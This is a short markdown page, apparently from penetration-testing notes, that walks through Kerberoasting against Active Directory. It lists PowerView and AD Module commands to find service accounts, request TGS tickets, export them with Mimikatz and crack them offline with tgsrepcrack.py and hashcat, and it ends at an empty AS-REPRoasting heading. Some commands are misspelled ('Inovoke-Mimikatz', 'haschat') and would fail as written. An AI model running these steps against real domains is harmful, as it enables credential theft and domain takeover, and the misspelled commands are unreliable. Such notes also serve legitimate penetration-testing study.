---
title: Domain Privilege Escalation
category: Active Directory
order: 4
---

Lets talk about some attacks to carry out a domain privilege escalation in order to obtain a Domain Controller.

# Kerberoasting

The Kerberos session ticket as known as `TGS` has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.

> **Note**: Service accounts are many times ignored. Password are rarely changed and have privileged access.


## Getting the TGS

First of all we need to find which users are used as *Service Accounts*:

* PowerView:
```powershell
Get-NetUser -SPN
```
* AD Module:
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

After enum it, we need to request a TGS:

* PowerView:
```powershell
Request-SPNTicket
```

* AD Module:
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/mgmt-user.corp.local"
```

> **Note**: With `klist` you can check if the TGS has been granted.

Finally all tickets should be exported.

```powershell
Inovoke-Mimikatz -Command '"kerberos::list /export"'
```

## Cracking the TGS

Once the tickets are exported it can be cracked with `john`, `hashcat` or `tgsrepcrack.py` tool:

```
python.exe .\tgsrepcrack.py wordlist.txt ticket.kirbi
```
To crack the ticket with hascat exists a script to export it to a hashcat format.

* https://github.com/jarilaos/kirbi2hashcat

```
haschat -a 0 -m 13100 wordlist.txt ticket.txt
```

# AS-REPRoasting


